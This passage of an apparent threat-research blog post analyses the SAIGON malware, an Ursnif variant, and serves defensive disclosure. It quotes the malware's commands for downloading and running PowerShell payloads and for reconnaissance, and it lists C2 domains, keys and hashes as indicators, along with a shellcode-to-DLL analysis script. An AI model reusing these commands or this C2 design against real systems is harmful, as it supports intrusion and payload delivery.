<td width="134"><p><i>MinimumUptime</i></p>
</td>
<td width="394"><p>Waits until the uptime is greater than this value (in seconds)</p>
</td>
</tr><tr><td width="103"><p><i>0x5beb543e</i></p>
</td>
<td width="134"><p><i>LoadPeriod</i></p>
</td>
<td width="394"><p>Number of seconds to wait between subsequent requests to the C2</p>
</td>
</tr><tr><td width="103"><p><i>0x84485ef2</i></p>
</td>
<td width="134"><p><i>HostKeepTime</i></p>
</td>
<td width="394"><p>The number of minutes to wait before switching to the next C2 server in case of failures</p>
</td>
</tr></tbody></table>
<p><span class="type-XS">Table 1: Configuration options</span></p>
<h5>Communication</h5>
<p>While the network communication structure of SAIGON is very similar to Ursnif v3, there are some subtle differences. SAIGON beacons are sent to the C2 servers as multipart/form-data encoded requests via HTTP POST to the &quot;<i>/index.html</i>&quot; URL path. The payload to be sent is first encrypted using Serpent encryption (in ECB mode vs CBC mode), then Base64-encoded. Responses from the server are encrypted with the same Serpent key and signed with the server's RSA private key.</p>
<p>SAIGON uses the following User-Agent header in its HTTP requests: &quot;<i>Mozilla/5.0 (Windows NT &lt;os_version&gt;; rv:58.0) Gecko/20100101 Firefox/58.0,</i>&quot; where <i>&lt;os_version&gt;</i> consists of the operating system's major and minor version number (e.g. 10.0 on Windows 10, and 6.1 on Windows 7) and the string &quot;<i>; Win64; x64</i>&quot; is appended when the operating system is 64-bit. This yields the following example User Agent strings:</p>
<ul>
<li>&quot;<i>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</i>&quot; on Windows 10 64-bit</li>
<li>&quot;<i>Mozilla/5.0 (Windows NT 6.1; rv:58.0) Gecko/20100101 Firefox/58.0</i>&quot; on Windows 7 32-bit</li>
</ul>
<p>The request format is also somewhat similar to the one used by other Ursnif variants described in Table 2:</p>
<table border="1" cellspacing="0" cellpadding="0">
<tbody><tr><td width="623" valign="top"><p>ver=%u&amp;group=%u&amp;id=%08x%08x%08x%08x&amp;type=%u&amp;uptime=%u&amp;knock=%u</p>
</td>
</tr></tbody></table>
<table border="1" cellspacing="0" cellpadding="0" width="631">
<tbody><tr><td width="69"><p><b>Name</b></p>
</td>
<td width="562"><p><b>Description</b></p>
</td>
</tr><tr><td width="69"><p><i>ver</i></p>
</td>
<td width="562"><p>Bot version (unlike other Ursnif variants this only contains the build number, so only the xxx digits from &quot;3.5.xxx&quot;)</p>
</td>
</tr><tr><td width="69"><p><i>group</i></p>
</td>
<td width="562"><p>Botnet ID</p>
</td>
</tr><tr><td width="69"><p><i>id</i></p>
</td>
<td width="562"><p>Client ID</p>
</td>
</tr><tr><td width="69"><p><i>type</i></p>
</td>
<td width="562"><p>Request type (0 – when polling for tasks, 6 – for system info data uploads)</p>
</td>
</tr><tr><td width="69"><p><i>uptime</i></p>
</td>
<td width="562"><p>Machine uptime in seconds</p>
</td>
</tr><tr><td width="69"><p><i>knock</i></p>
</td>
<td width="562"><p>The bot &quot;knock&quot; period (number of seconds to wait between subsequent requests to the C2, see the LoadPeriod configuration option)</p>
</td>
</tr></tbody></table>
<p><span class="type-XS">Table 2: Request format components</span></p>
<h5>Capabilities</h5>
<p>SAIGON implements the bot commands described in Table 3.</p>
<table border="1" cellspacing="0" cellpadding="0" width="631">
<tbody><tr><td width="101"><p><b>Name Checksum</b></p>
</td>
<td width="120"><p><b>Name</b></p>
</td>
<td width="410"><p><b>Description</b></p>
</td>
</tr><tr><td width="101"><p><i>0x45d4bf54</i></p>
</td>
<td width="120"><p><i>SELF_DELETE</i></p>
</td>
<td width="410"><p>Uninstalls itself from the machine; removes scheduled task and deletes its registry key</p>
</td>
</tr><tr><td width="101"><p><i>0xd86c3bdc</i></p>
</td>
<td width="120"><p><i>LOAD_UPDATE</i></p>
</td>
<td width="410"><p>Download data from URL, decrypt and verify signature, save it as a <i>.ps1</i> file and run it using &quot;<i>PowerShell.exe -ep unrestricted -file %s</i>&quot;</p>
</td>
</tr><tr><td width="101"><p><i>0xeac44e42</i></p>
</td>
<td width="120"><p><i>GET_SYSINFO</i></p>
</td>
<td width="410"><p>Collects and uploads system information by running:</p>
<ol>
<li>&quot;<i>systeminfo.exe</i>&quot;</li>
<li>&quot;<i>net view</i>&quot;</li>
<li>&quot;<i>nslookup 127.0.0.1</i>&quot;</li>
<li>&quot;<i>tasklist.exe /SVC</i>&quot;</li>
<li>&quot;<i>driverquery.exe</i>&quot;</li>
<li>&quot;<i>reg.exe query </i>&quot;<i>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall</i>&quot;<i> /s</i>&quot;</li>
</ol>
</td>
</tr><tr><td width="101"><p><i>0x83bf8ea0</i></p>
</td>
<td width="120"><p><i>LOAD_DLL</i></p>
</td>
<td width="410"><p>Download data from URL, decrypt and verify, then use the same shellcode loader that was used to load itself into memory to load the DLL into the current process</p>
</td>
</tr><tr><td width="101"><p><i>0xa8e78c43</i></p>
</td>
<td width="120"><p><i>LOAD_EXE</i></p>
</td>
<td width="410"><p>Download data from URL, decrypt and verify, save with an <i>.exe</i> extension, invoke using <i>ShellExecute</i></p>
</td>
</tr></tbody></table>
<p><span class="type-XS">Table 3: SAIGON bot commands</span></p>
<h5>Comparison to Ursnif v3</h5>
<p>Table 4 shows the similarities between Ursnif v3 and the analyzed SAIGON samples (differences are highlighted in <b>bold</b>):</p>
<table border="1" cellspacing="0" cellpadding="0" width="631">
<tbody><tr><td width="188"><p><b>&nbsp;</b></p>
</td>
<td width="221"><p><b>Ursnif v3 (RM3)</b></p>
</td>
<td width="221"><p><b>Saigon (Ursnif v3.5?)</b></p>
</td>
</tr><tr><td width="188"><p><i>Persistence method</i></p>
</td>
<td width="221"><p>Scheduled task that executes code stored in a registry key using PowerShell</p>
</td>
<td width="221"><p>Scheduled task that executes code stored in a registry key using PowerShell</p>
</td>
</tr><tr><td width="188"><p><i>Configuration storage</i></p>
</td>
<td width="221"><p>Security PE directory points to embedded binary data starting with '<i>WD</i>' magic bytes (aka. Ursnif &quot;joined files&quot;)</p>
</td>
<td width="221"><p>Security PE directory points to embedded binary data starting with '<i>WD</i>' magic bytes (aka. Ursnif &quot;joined files&quot;)</p>
</td>
</tr><tr><td width="188"><p><i>PRNG algorithm</i></p>
</td>
<td width="221"><p>xorshift64*</p>
</td>
<td width="221"><p>xorshift64*</p>
</td>
</tr><tr><td width="188"><p><i>Checksum algorithm</i></p>
</td>
<td width="221"><p><b>JAMCRC (aka. CRC32 with all the bits flipped)</b></p>
</td>
<td width="221"><p><b>CRC32, with the result rotated to the right by 1 bit</b></p>
</td>
</tr><tr><td width="188"><p><i>Data compression</i></p>
</td>
<td width="221"><p>aPLib</p>
</td>
<td width="221"><p>aPLib</p>
</td>
</tr><tr><td width="188"><p><i>Encryption/Decryption</i></p>
</td>
<td width="221"><p>Serpent <b>CBC</b></p>
</td>
<td width="221"><p>Serpent <b>ECB</b></p>
</td>
</tr><tr><td width="188"><p><i>Data integrity verification</i></p>
</td>
<td width="221"><p>RSA signature</p>
</td>
<td width="221"><p>RSA signature</p>
</td>
</tr><tr><td width="188"><p><i>Communication method</i></p>
</td>
<td width="221"><p>HTTP POST requests</p>
</td>
<td width="221"><p>HTTP POST requests</p>
</td>
</tr><tr><td width="188"><p><i>Payload encoding</i></p>
</td>
<td width="221"><p>Unpadded Base64 ('+' and '/' are replaced with '<b>_2B</b>' and '<b>_2F</b>' respectively), <b>random slashes are added</b></p>
</td>
<td width="221"><p>Unpadded Base64 ('+' and '/' are replaced with '<b>%2B</b>' and '<b>%2F</b>' respectively), <b>no random slashes</b></p>
</td>
</tr><tr><td width="188"><p><i>Uses URL path mimicking?</i></p>
</td>
<td width="221"><p><b>Yes</b></p>
</td>
<td width="221"><p><b>No</b></p>
</td>
</tr><tr><td width="188"><p><i>Uses PX file format?</i></p>
</td>
<td width="221"><p><b>Yes</b></p>
</td>
<td width="221"><p><b>No</b></p>
</td>
</tr></tbody></table>
<p><span class="type-XS">Table 4: Similarities and differences between Ursnif v3 and SAIGON samples</span></p>
<p>Figure 4 shows Ursnif v3's use of URL path mimicking. This tactic has not been seen in other Ursnif variants, including SAIGON.</p>
<p><img src="/content/dam/fireeye-www/blog/images/saigon/Picture4.png" alt=""><br>
<span class="type-XS">Figure 4:&nbsp;Ursnif v3 mimicking (red) previously seen benign browser traffic (green) not seen in SAIGON samples&nbsp;</span></p>
<h4>Implications</h4>
<p>It is currently unclear whether SAIGON is representative of a broader evolution in the Ursnif malware ecosystem. The low number of SAIGON samples identified thus far—all of which have compilations timestamps in 2018—may suggest that SAIGON was a temporary branch of Ursnif v3 adapted for use in a small number of operations. Notably, SAIGON’s capabilities also distinguish it from typical banking malware and may be more suited toward supporting targeted intrusion operations. This is further supported via our prior identification of SAIGON on a server that hosted tools used in point-of-sale intrusion operations as well as <a href="https://usa.visa.com/dam/VCOM/global/support-legal/documents/cybercrime-groups-targeting-fuel-dispenser-merchants.pdf">VISA’s</a> recent notification of the malware appearing on a compromised hospitality organization’s network along with tools previously used by FIN8.</p>
<h4>Acknowledgements</h4>
<p>The authors would like to thank Kimberly Goody, Jeremy Kennelly and James Wyke for their support on this blog post.</p>
<h4>Appendix A: Samples</h4>
<p>The following is a list of samples including their embedded configuration:</p>
<p>Sample SHA256: 8ded07a67e779b3d67f362a9591cce225a7198d2b86ec28bbc3e4ee9249da8a5<br>
Sample Version: 3.50.132<br>
PE Timestamp: 2018-07-07T14:51:30<br>
XOR Cookie: 0x40d822d9<br>
C2 URLs:</p>
<ul>
<li>https://google-download[.]com</li>
<li>https://cdn-google-eu[.]com</li>
<li>https://cdn-gmail-us[.]com</li>
</ul>
<p>Group / Botnet ID: 1001<br>
Server Key: rvXxkdL5DqOzIRfh<br>
Idle Period: 30<br>
Load Period: 300<br>
Host Keep Time: 1440<br>
RSA Public Key: (0xd2185e9f2a77f781526f99baf95dff7974e15feb4b7c7a025116dec10aec8b38c808f5f0bb21ae575672b1502ccb5c<br>
021c565359255265e0ca015290112f3b6cb72c7863309480f749e38b7d955e410cb53fb3ecf7c403f593518a2cf4915<br>
d0ff70c3a536de8dd5d39a633ffef644b0b4286ba12273d252bbac47e10a9d3d059, 0x10001)</p>
<p>Sample SHA256: c6a27a07368abc2b56ea78863f77f996ef4104692d7e8f80c016a62195a02af6<br>
Sample Version: 3.50.132<br>
PE Timestamp: 2018-07-07T14:51:41<br>
XOR Cookie: 0x40d822d9<br>
C2 URLs:</p>
<ul>
<li>https://google-download[.]com</li>
<li>https://cdn-google-eu[.]com</li>
<li>https://cdn-gmail-us[.]com</li>
</ul>
<p>Group / Botnet ID: 1001<br>
Server Key: rvXxkdL5DqOzIRfh<br>
Idle Period: 30<br>
Load Period: 300<br>
Host Keep Time: 1440<br>
RSA Public Key: (0xd2185e9f2a77f781526f99baf95dff7974e15feb4b7c7a025116dec10aec8b38c808f5f0bb21ae575672b1502ccb5c<br>
021c565359255265e0ca015290112f3b6cb72c7863309480f749e38b7d955e410cb53fb3ecf7c403f593518a2cf4915<br>
d0ff70c3a536de8dd5d39a633ffef644b0b4286ba12273d252bbac47e10a9d3d059, 0x10001)</p>
<p>Sample SHA256: 431f83b1af8ab7754615adaef11f1d10201edfef4fc525811c2fcda7605b5f2e<br>
Sample Version: 3.50.199<br>
PE Timestamp: 2018-11-15T11:17:09<br>
XOR Cookie: 0x40d822d9<br>
C2 URLs:</p>
<ul>
<li>https://mozilla-yahoo[.]com</li>
<li>https://cdn-mozilla-sn45[.]com</li>
<li>https://cdn-digicert-i31[.]com</li>
</ul>
<p>Group / Botnet ID: 1000<br>
Server Key: rvXxkdL5DqOzIRfh<br>
Idle Period: 60<br>
Load Period: 300<br>
Host Keep Time: 1440<br>
RSA Public Key: (0xd2185e9f2a77f781526f99baf95dff7974e15feb4b7c7a025116dec10aec8b38c808f5f0bb21ae575672b15<br>
02ccb5c021c565359255265e0ca015290112f3b6cb72c7863309480f749e38b7d955e410cb53fb3ecf7c403f5<br>
93518a2cf4915d0ff70c3a536de8dd5d39a633ffef644b0b4286ba12273d252bbac47e10a9d3d059, 0x10001)</p>
<p>Sample SHA256: 628cad1433ba2573f5d9fdc6d6ac2c7bd49a8def34e077dbbbffe31fb6b81dc9<br>
Sample Version: 3.50.209<br>
PE Timestamp: 2018-12-04T10:47:56<br>
XOR Cookie: 0x40d822d9<br>
C2 URLs</p>
<ul>
<li>http://softcloudstore[.]com</li>
<li>http://146.0.72.76</li>
<li>http://setworldtime[.]com</li>
<li>https://securecloudbase[.]com</li>
</ul>
<p>Botnet ID: 1000<br>
Server Key: 0123456789ABCDEF<br>
Idle Period: 20<br>
Minimum Uptime: 300<br>
Load Period: 1800<br>
Host Keep Time: 360<br>
RSA Public Key: (0xdb7c3a9ea68fbaf5ba1aebc782be3a9e75b92e677a114b52840d2bbafa8ca49da40a64664d80cd62d9453<br>
34f8457815dd6e75cffa5ee33ae486cb6ea1ddb88411d97d5937ba597e5c430a60eac882d8207618d14b660<br>
70ee8137b4beb8ecf348ef247ddbd23f9b375bb64017a5607cb3849dc9b7a17d110ea613dc51e9d2aded, 0x10001)</p>
<h4>Appendix B: IOCs</h4>
<p>Sample hashes:</p>
<ul>
<li>8ded07a67e779b3d67f362a9591cce225a7198d2b86ec28bbc3e4ee9249da8a5</li>
<li>c6a27a07368abc2b56ea78863f77f996ef4104692d7e8f80c016a62195a02af6</li>
<li>431f83b1af8ab7754615adaef11f1d10201edfef4fc525811c2fcda7605b5f2e [<a href="https://www.virustotal.com/gui/file/431f83b1af8ab7754615adaef11f1d10201edfef4fc525811c2fcda7605b5f2e">VT</a>]</li>
<li>628cad1433ba2573f5d9fdc6d6ac2c7bd49a8def34e077dbbbffe31fb6b81dc9 [<a href="https://www.virustotal.com/gui/file/628cad1433ba2573f5d9fdc6d6ac2c7bd49a8def34e077dbbbffe31fb6b81dc9">VT</a>]</li>
</ul>
<p>C2 servers:</p>
<ul>
<li>https://google-download[.]com</li>
<li>https://cdn-google-eu[.]com</li>
<li>https://cdn-gmail-us[.]com</li>
<li>https://mozilla-yahoo[.]com</li>
<li>https://cdn-mozilla-sn45[.]com</li>
<li>https://cdn-digicert-i31[.]com</li>
<li>http://softcloudstore[.]com</li>
<li>http://146.0.72.76</li>
<li>http://setworldtime[.]com</li>
<li>https://securecloudbase[.]com</li>
</ul>
<p>User-Agent:</p>
<ul>
<li>&quot;Mozilla/5.0 (Windows NT <i>&lt;os_version&gt;</i>; rv:58.0) Gecko/20100101 Firefox/58.0&quot;</li>
</ul>
<p>Other host-based indicators:</p>
<ul>
<li>&quot;Power<i>&lt;random_string&gt;</i>&quot; scheduled task</li>
<li>&quot;PsRun&quot; value under the HKCU\Identities\{<i>&lt;random_guid&gt;</i>} registry key</li>
</ul>
<h4>Appendix C: Shellcode Converter Script</h4>
<p>The following Python script is intended to ease analysis of this malware. This script converts the SAIGON shellcode blob back into its original DLL form by removing the PE loader and restoring its PE header. These changes make the analysis of SAIGON shellcode blobs much simpler (e.g. allow loading of the files in IDA), however, the created DLLs will still crash when run in a debugger as the malware still relies on its (now removed) PE loader during the process injection stage of its execution. After this conversion process, the sample is relatively easy to analyze due to its small size and because it is not obfuscated.</p>
<table border="1" cellspacing="0" cellpadding="0">
<tbody><tr><td width="623" valign="top"><p>#!/usr/bin/env python3<br>
import argparse<br>
import struct<br>
from datetime import datetime</p>
<p>MZ_HEADER = bytes.fromhex(<br>
&nbsp; &nbsp; '4d5a90000300000004000000ffff0000'<br>
&nbsp; &nbsp; 'b8000000000000004000000000000000'<br>
&nbsp; &nbsp; '00000000000000000000000000000000'<br>
&nbsp; &nbsp; '00000000000000000000000080000000'<br>
&nbsp; &nbsp; '0e1fba0e00b409cd21b8014ccd215468'<br>
&nbsp; &nbsp; '69732070726f6772616d2063616e6e6f'<br>
&nbsp; &nbsp; '742062652072756e20696e20444f5320'<br>
&nbsp; &nbsp; '6d6f64652e0d0d0a2400000000000000'<br>
)</p>
<p>def main():<br>
&nbsp; &nbsp; parser = argparse.ArgumentParser(description=&quot;Shellcode to PE converter for the Saigon malware family.&quot;)<br>
&nbsp; &nbsp; parser.add_argument(&quot;sample&quot;)<br>
&nbsp; &nbsp; args = parser.parse_args()</p>
<p>&nbsp;&nbsp;&nbsp; with open(args.sample, &quot;rb&quot;) as f:<br>
&nbsp; &nbsp; &nbsp; &nbsp; data = bytearray(f.read())</p>
<p>&nbsp;&nbsp;&nbsp; if data.startswith(b'MZ'):<br>
&nbsp; &nbsp; &nbsp; &nbsp; lfanew = struct.unpack_from('=I', data, 0x3c)[0]<br>
&nbsp; &nbsp; &nbsp; &nbsp; print('This is already an MZ/PE file.')<br>
&nbsp; &nbsp; &nbsp; &nbsp; return<br>
&nbsp; &nbsp; elif not data.startswith(b'\xe9'):<br>
&nbsp; &nbsp; &nbsp; &nbsp; print('Unknown file type.')<br>
&nbsp; &nbsp; &nbsp; &nbsp; return</p>
<p>&nbsp;&nbsp;&nbsp; struct.pack_into('=I', data, 0, 0x00004550)<br>
&nbsp; &nbsp; if data[5] == 0x01:<br>
&nbsp; &nbsp; &nbsp; &nbsp; struct.pack_into('=H', data, 4, 0x14c)<br>
&nbsp; &nbsp; elif data[5] == 0x86:<br>
&nbsp; &nbsp; &nbsp; &nbsp; struct.pack_into('=H', data, 4, 0x8664)<br>
&nbsp; &nbsp; else:<br>
&nbsp; &nbsp; &nbsp; &nbsp; print('Unknown architecture.')<br>
&nbsp; &nbsp; &nbsp; &nbsp; return</p>
<p>&nbsp;&nbsp;&nbsp; # file alignment<br>
&nbsp; &nbsp; struct.pack_into('=I', data, 0x3c, 0x200)</p>
<p>&nbsp;&nbsp;&nbsp; optional_header_size, _ = struct.unpack_from('=HH', data, 0x14)<br>
&nbsp; &nbsp; magic, _, _, size_of_code = struct.unpack_from('=HBBI', data, 0x18)<br>
&nbsp; &nbsp; print('Magic:', hex(magic))<br>
&nbsp; &nbsp; print('Size of code:', hex(size_of_code))</p>
<p>&nbsp;&nbsp;&nbsp; base_of_code, base_of_data = struct.unpack_from('=II', data, 0x2c)</p>
<p>&nbsp;&nbsp;&nbsp; if magic == 0x20b:<br>
&nbsp; &nbsp; &nbsp; &nbsp; # base of data, does not exist in PE32+<br>
&nbsp; &nbsp; &nbsp; &nbsp; if size_of_code &amp; 0x0fff:<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; tmp = (size_of_code &amp; 0xfffff000) + 0x1000<br>
&nbsp; &nbsp; &nbsp; &nbsp; else:<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; tmp = size_of_code<br>
&nbsp; &nbsp; &nbsp; &nbsp; base_of_data = base_of_code + tmp</p>
<p>&nbsp;&nbsp;&nbsp; print('Base of code:', hex(base_of_code))<br>
&nbsp; &nbsp; print('Base of data:', hex(base_of_data))</p>
<p>&nbsp;&nbsp;&nbsp; data[0x18 + optional_header_size : 0x1000] = b'\0' * (0x1000 - 0x18 - optional_header_size)</p>
<p>&nbsp;&nbsp;&nbsp; size_of_header = struct.unpack_from('=I', data, 0x54)[0]</p>
<p>&nbsp;&nbsp;&nbsp; data_size = 0x3000<br>
&nbsp; &nbsp; pos = data.find(struct.pack('=IIIII', 3, 5, 7, 11, 13))<br>
&nbsp; &nbsp; if pos &gt;= 0:<br>
&nbsp; &nbsp; &nbsp; &nbsp; data_size = pos - base_of_data</p>
<p>&nbsp;&nbsp;&nbsp; section = 0<br>
&nbsp; &nbsp; struct.pack_into('=8sIIIIIIHHI', data, 0x18 + optional_header_size + 0x28 * section,<br>
&nbsp; &nbsp; &nbsp; &nbsp; b'.text',<br>
&nbsp; &nbsp; &nbsp; &nbsp; size_of_code, base_of_code,<br>
&nbsp; &nbsp; &nbsp; &nbsp; base_of_data - base_of_code, size_of_header,<br>
&nbsp; &nbsp; &nbsp; &nbsp; 0, 0,<br>
&nbsp; &nbsp; &nbsp; &nbsp; 0, 0,<br>
&nbsp; &nbsp; &nbsp; &nbsp; 0x60000020<br>
&nbsp; &nbsp; )<br>
&nbsp; &nbsp; section += 1<br>
&nbsp; &nbsp; struct.pack_into('=8sIIIIIIHHI', data, 0x18 + optional_header_size + 0x28 * section,<br>
&nbsp; &nbsp; &nbsp; &nbsp; b'.rdata',<br>
&nbsp; &nbsp; &nbsp; &nbsp; data_size, base_of_data,<br>
&nbsp; &nbsp; &nbsp; &nbsp; data_size, size_of_header + base_of_data - base_of_code,<br>
&nbsp; &nbsp; &nbsp; &nbsp; 0, 0,<br>
&nbsp; &nbsp; &nbsp; &nbsp; 0, 0,<br>
&nbsp; &nbsp; &nbsp; &nbsp; 0x40000040<br>
&nbsp; &nbsp; )<br>
&nbsp; &nbsp; section += 1<br>
&nbsp; &nbsp; struct.pack_into('=8sIIIIIIHHI', data, 0x18 + optional_header_size + 0x28 * section,<br>
&nbsp; &nbsp; &nbsp; &nbsp; b'.data',<br>
&nbsp; &nbsp; &nbsp; &nbsp; 0x1000, base_of_data + data_size,<br>
&nbsp; &nbsp; &nbsp; &nbsp; 0x1000, size_of_header + base_of_data - base_of_code + data_size,<br>
&nbsp; &nbsp; &nbsp; &nbsp; 0, 0,<br>
&nbsp; &nbsp; &nbsp; &nbsp; 0, 0,<br>
&nbsp; &nbsp; &nbsp; &nbsp; 0xc0000040<br>
&nbsp; &nbsp; )</p>
<p>&nbsp;&nbsp;&nbsp; if magic == 0x20b:<br>
&nbsp; &nbsp; &nbsp; &nbsp; section += 1<br>
&nbsp; &nbsp; &nbsp; &nbsp; struct.pack_into('=8sIIIIIIHHI', data, 0x18 + optional_header_size + 0x28 * section,<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; b'.pdata',<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x1000, base_of_data + data_size + 0x1000,<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x1000, size_of_header + base_of_data - base_of_code + data_size + 0x1000,<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0, 0,<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0, 0,<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x40000040<br>
&nbsp; &nbsp; &nbsp; &nbsp; )<br>
&nbsp; &nbsp; &nbsp; &nbsp; section += 1<br>
&nbsp; &nbsp; &nbsp; &nbsp; struct.pack_into('=8sIIIIIIHHI', data, 0x18 + optional_header_size + 0x28 * section,<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; b'.bss',<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x1600, base_of_data + data_size + 0x2000,<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; len(data[base_of_data + data_size + 0x2000:]), size_of_header + base_of_data - base_of_code + data_size + 0x2000,<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0, 0,<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0, 0,<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0xc0000040<br>
&nbsp; &nbsp; &nbsp; &nbsp; )<br>
&nbsp; &nbsp; else:<br>
&nbsp; &nbsp; &nbsp; &nbsp; section += 1<br>
&nbsp; &nbsp; &nbsp; &nbsp; struct.pack_into('=8sIIIIIIHHI', data, 0x18 + optional_header_size + 0x28 * section,<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; b'.bss',<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x1000, base_of_data + data_size + 0x1000,<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x1000, size_of_header + base_of_data - base_of_code + data_size + 0x1000,<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0, 0,<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0, 0,<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0xc0000040<br>
&nbsp; &nbsp; &nbsp; &nbsp; )<br>
&nbsp; &nbsp; &nbsp; &nbsp; section += 1<br>
&nbsp; &nbsp; &nbsp; &nbsp; struct.pack_into('=8sIIIIIIHHI', data, 0x18 + optional_header_size + 0x28 * section,<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; b'.reloc',<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x2000, base_of_data + data_size + 0x2000,<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; len(data[base_of_data + data_size + 0x2000:]), size_of_header + base_of_data - base_of_code + data_size + 0x2000,<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0, 0,<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0, 0,<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x40000040<br>
&nbsp; &nbsp; &nbsp; &nbsp; )</p>
<p>&nbsp;&nbsp;&nbsp; header = MZ_HEADER + data[:size_of_header - len(MZ_HEADER)]<br>
&nbsp; &nbsp; pe = bytearray(header + data[0x1000:])<br>
&nbsp; &nbsp; with open(args.sample + '.dll', 'wb') as f:<br>
&nbsp; &nbsp; &nbsp; &nbsp; f.write(pe)</p>
<p>&nbsp;&nbsp;&nbsp; lfanew = struct.unpack_from('=I', pe, 0x3c)[0]<br>
&nbsp; &nbsp; timestamp = struct.unpack_from('=I', pe, lfanew + 8)[0]<br>
&nbsp; &nbsp; print('PE timestamp:', datetime.utcfromtimestamp(timestamp).isoformat())</p>
<p>&nbsp;</p>
<p>if __name__ == &quot;__main__&quot;:<br>
&nbsp; &nbsp; main()</p>
</td>
</tr></tbody></table>
</div>
<div class="clear-all"></div></div>
</div>
<div class="par prevnextbutton">
<div class="prevnext">
<div class="button">
<a id="leftBtnId" class="btn btn-B2282D" href="#"><span>Previous</span> <span>Post</span></a>
</div>
<div class="button">
<a id="rightBtnId" class="btn btn-B2282D" href="#"><span>Next</span> <span>Post</span></a>
</div>
</div>
<input type="hidden" value="/content/fireeye-www/en_US/blog/threat-research" id="categoryPathVal" name="categoryPath" />
<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
    $(document).ready(function(){

         var prevenextHtml = $('.prevnext').html();	
         var categoryPathVal = $("#categoryPathVal").val();
            var blogsDetails;
        
            if(undefined == blogsDetails){
                    blogsDetails = [];
            }
        
        
            if(undefined != prevenextHtml){
                if(blogsDetails.length <= 0){
                     $.ajax({
                        type: "GET",
                        url: "/bin/www-blogs/read-blogentries",
                        dataType: "json",
                        data: { categoryPath: categoryPathVal} ,
                        async: false,
                        success : function(data) {
                            var totalFoundRes = data.blogs.length;
                            blogsDetails = data.blogs;
                            var currentPagePath = window.location.pathname;
                            currentPagePath = currentPagePath.split(".")[0]
                            console.log("currentPagePath :: "+currentPagePath);
        
                            for (var i = 0; i < blogsDetails.length; i++) {
                                var currentItrPath = blogsDetails[i].path;
        
                                if (currentItrPath.indexOf(currentPagePath) > -1) {
                                    console.log(blogsDetails[i-1]);
                                    console.log(blogsDetails[i+1]);

                                    if(undefined != blogsDetails[i-1] ){
										var prevPagePath = blogsDetails[i-1].path;
                                        $("#leftBtnId").attr("href",prevPagePath+".html");
                                        $("#leftBtnId").show();
                                    }else{
										$("#leftBtnId").hide();
                                    }
                                    if(undefined != blogsDetails[i+1] ){
										var nextPagePath = blogsDetails[i+1].path;  
                                    	$("#rightBtnId").attr("href",nextPagePath+".html");
                                        $("#rightBtnId").show();
                                    }else{
										$("#rightBtnId").hide();
                                    }
                                }
                            }
        
                        },
                        error : function(response){
                            console.log("Error: while connecting to servlet.");
                        }
                    });
                 }else{
                     alert("Blogs from global object :: "+blogsDetails);
                 }
            }else{
                alert("prevenextHtml :: "+prevenextHtml);
            }
    });
</script></div>
</div></div>
</div>
</div>
<div id="sidebar" class="g-u-7-24 l_g-u-1 blog-sidebar">
<div class="g-content">
<div class="sidebar reuse-blog-resources">
<div class="blog-resources">
<div class="grid-33-left parsys"><div class="rightrail section">
<div class="blog-right-rail">
<div class="bottom-bar"><div class="tab">
<span class="ficon ficon-star"></span>
<p>Promotion</p></div><div class="tab">
<span class="ficon ficon-checkbox-checked"></span>
<p>Subscribe</p></div>
<div class="tab">
<span class="ficon ficon-share"></span>
<p>Share</p></div>
<div class="tab">
<span class="ficon ficon-history2"></span>
<p>Recent</p></div>
<div class="tab">
<span class="ficon ficon-feed"></span>
<p>RSS</p></div>
</div><div class="section cta">
<div id="cq-image-jsp-/content/fireeye-www/site-content/en_US/blog-right-threat-research/jcr:content/grid-33-left/rightrail/image"><a href="/mandiant/advantage.html"><img src="/content/dam/fireeye-www/services/images/bnr-mandiant-advantage-v3-315x315.png" alt="bnr-mandiant-advantage-v3-315x315" title="bnr-mandiant-advantage-v3-315x315" class="cq-dd-image"></a></div></div><div class="section email">
<script src="https://www2.fireeye.com/js/forms2/js/forms2.min.js"></script>
<div id="mktoWrapper_3353" class="a08 bg-f2f2f2"><div class="c00 c00v0"><h3>Email Updates</h3><p>Information and insight on today's advanced threats from FireEye.</p></div><form id="mktoForm_3353"></form> <script type="text/javascript">
		if(typeof digitalData=="undefined"){digitalData={}}
        //alert(https://www2.fireeye.com+":"+848-DID-242)
        //alert("false");
		MktoForms2.loadForm("https://www2.fireeye.com", "848-DID-242", 3353,
		function(form) {
			
            if(typeof fdc.blog.initCheckboxes === "function") {
                fdc.blog.initCheckboxes(form);
            } 
			digitalData.form = {id: form.getId(),name: document.title,url: window.location.href};
